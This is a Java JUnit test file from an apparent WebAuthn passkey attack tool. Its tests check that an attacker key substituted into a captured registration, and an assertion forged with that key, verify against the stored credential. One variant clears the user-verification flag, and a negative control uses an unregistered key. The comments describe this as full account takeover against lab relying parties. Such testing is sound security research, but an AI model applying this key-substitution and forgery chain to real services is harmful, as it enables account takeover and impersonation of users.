package com.anvil.passkeyeditor.attacks;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertTrue;

import com.anvil.passkeyeditor.Fixtures;
import com.anvil.passkeyeditor.codec.CborCodec;
import com.anvil.passkeyeditor.codec.WrapperCodec;
import com.anvil.passkeyeditor.codec.Webauthn4jCborCodec;
import com.anvil.passkeyeditor.crypto.Es256Signer;
import com.anvil.passkeyeditor.model.AttestationObject;
import com.anvil.passkeyeditor.model.AuthenticatorData;
import com.anvil.passkeyeditor.model.CoseKey;
import com.anvil.passkeyeditor.util.AuthDataEditor;

import com.webauthn4j.data.attestation.authenticator.COSEKey;
import com.webauthn4j.util.SignatureUtil;

import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.security.PublicKey;
import java.security.Signature;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.junit.jupiter.api.Test;

/**
 * The forgery oracle. This is the headless mirror of the live success case:
 * substitute our key into the real captured registration, forge an assertion over the real
 * captured authentication with that key, and prove the signature verifies against the key the secure
 * RP would have stored - under webauthn4j's own ES256 verifier. If this is green, a secure RP that
 * stored our substituted credential key accepts our forged assertion, and the live test is only wire
 * plumbing.
 *
 * It deliberately spans both boundaries already proven in isolation (substitution byte-identity in
 * {@code FromFieldsEncodeTest}; re-sign correctness in {@code ReSignOracleTest}) and joins them across the
 * registration→assertion seam on foreign-produced Chrome bytes - the strongest oracle available without Burp.
 */
class ForgeryOracleTest {

    private final WrapperCodec wrapper = new WrapperCodec.Default();
    private final CborCodec cbor = new Webauthn4jCborCodec();

    // ---- real-fixture plumbing (same discipline as FromFieldsEncodeTest) -----------------------

    private static String loadFixture(String name) {
        try (InputStream in = ForgeryOracleTest.class.getResourceAsStream("/fixtures/" + name)) {
            if (in == null) {
                throw new IllegalStateException("missing test fixture: /fixtures/" + name);
            }
            return new String(in.readAllBytes(), StandardCharsets.UTF_8);
        } catch (IOException e) {
            throw new IllegalStateException(e);
        }
    }

    /** The base64url wire bytes (ASCII) of a string member in a captured JSON body. */
    private static byte[] field(String body, String name) {
        Matcher m = Pattern.compile("\"" + name + "\":\"([^\"]+)\"").matcher(body);
        if (!m.find()) {
            throw new IllegalStateException("field not found: " + name);
        }
        return m.group(1).getBytes(StandardCharsets.US_ASCII);
    }

    private byte[] realRegistrationAttestationCbor() {
        return wrapper.unwrap(field(loadFixture("reg-clean.json"), "attestationObject")).inner();
    }

    private byte[] realAssertionAuthData() {
        return wrapper.unwrap(field(loadFixture("auth-clean.json"), "authenticatorData")).inner();
    }

    private byte[] realAssertionClientData() {
        return wrapper.unwrap(field(loadFixture("auth-clean.json"), "clientDataJSON")).inner();
    }

    /** The JCA public key a relying party recovers from a stored COSE credential key. */
    private PublicKey rpStoredPublicKey(CoseKey credentialKey) {
        byte[] coseCbor = cbor.encodeCoseKey(credentialKey);
        COSEKey w4j = Fixtures.decodeCoseKey(coseCbor);
        return w4j.getPublicKey();
    }

    // ---- the gate ------------------------------------------------------------------------------

    @Test
    void secureRpStoringOurSubstitutedKeyAcceptsOurForgedAssertion() throws Exception {
        // 1) The attacker key, substituted into the REAL registration (fmt forced to none).
        Es256Signer attacker = Es256Signer.generate();
        AttestationObject reg = cbor.decodeAttestationObject(realRegistrationAttestationCbor());
        byte[] substitutedReg = new RegistrationSubstituter(cbor).substituteAndEncode(reg, attacker);

        // The credential public key the RP would store, recovered from our rebuilt registration.
        CoseKey storedKey = cbor.decodeAttestationObject(substitutedReg).authData().credentialPublicKey();
        assertNotNull(storedKey, "substituted registration carries a credential key");
        PublicKey rpStored = rpStoredPublicKey(storedKey);

        // 2) Forge an assertion over the REAL captured authentication bytes with the attacker key.
        byte[] authData = realAssertionAuthData();
        byte[] clientData = realAssertionClientData();
        byte[] forgedSig = new AssertionForger().sign(authData, clientData, attacker);

        // 3) The RP-stored key must verify our forged signature (webauthn4j's own ES256 verifier).
        Signature v = SignatureUtil.createES256();
        v.initVerify(rpStored);
        v.update(AssertionForger.signedInput(authData, clientData));
        assertTrue(v.verify(forgedSig),
                "a secure RP holding our substituted key accepts our forged assertion (full ATO)");
    }

    @Test
    void forgingAUvZeroAssertionStillProducesAValidSignature() throws Exception {
        // The re-signed UV=0 assertion verifies CRYPTOGRAPHICALLY under our substituted key - but this is
        // NOT a secure-RP bypass: a UV-ENFORCING RP rejects !uv on policy BEFORE it checks the signature,
        // so the acceptance oracle for UV=0 is a non-UV-enforcing RP (:8001 VULN=uv), not secure :8000
        // (the secure-accept success case is the UV=1 case above). This test pins only the crypto; the UV
        // policy gate lives in the RP and is mirrored by the oracle.
        Es256Signer attacker = Es256Signer.generate();
        AttestationObject reg = cbor.decodeAttestationObject(realRegistrationAttestationCbor());
        byte[] substitutedReg = new RegistrationSubstituter(cbor).substituteAndEncode(reg, attacker);
        PublicKey rpStored = rpStoredPublicKey(
                cbor.decodeAttestationObject(substitutedReg).authData().credentialPublicKey());

        byte[] authData = AuthDataEditor.withFlags(realAssertionAuthData(), AuthenticatorData.FLAG_UP); // UV cleared
        // Pin that the UV bit was actually cleared on the SIGNED bytes (guards against withFlags no-op'ing).
        assertEquals((byte) 0x01, authData[AuthenticatorData.FLAGS_OFFSET], "UV cleared on the forged authData");
        byte[] clientData = realAssertionClientData();
        byte[] forgedSig = new AssertionForger().sign(authData, clientData, attacker);

        Signature v = SignatureUtil.createES256();
        v.initVerify(rpStored);
        v.update(AssertionForger.signedInput(authData, clientData));
        assertTrue(v.verify(forgedSig),
                "the forged UV=0 assertion is cryptographically valid (a UV-enforcing RP still rejects it on policy)");
    }

    @Test
    void anUnrelatedKeyDoesNotVerify() throws Exception {
        // Negative control: a forgery signed by a DIFFERENT key must not verify against the stored key -
        // proves the oracle discriminates (the registration substitution is what makes the forgery work).
        Es256Signer registered = Es256Signer.generate();
        Es256Signer attacker = Es256Signer.generate(); // never registered

        AttestationObject reg = cbor.decodeAttestationObject(realRegistrationAttestationCbor());
        byte[] substitutedReg = new RegistrationSubstituter(cbor).substituteAndEncode(reg, registered);
        PublicKey rpStored = rpStoredPublicKey(
                cbor.decodeAttestationObject(substitutedReg).authData().credentialPublicKey());

        byte[] authData = realAssertionAuthData();
        byte[] clientData = realAssertionClientData();
        byte[] forgedSig = new AssertionForger().sign(authData, clientData, attacker);

        Signature v = SignatureUtil.createES256();
        v.initVerify(rpStored);
        v.update(AssertionForger.signedInput(authData, clientData));
        assertTrue(!v.verify(forgedSig), "a forgery by an unregistered key must be rejected");
    }
}
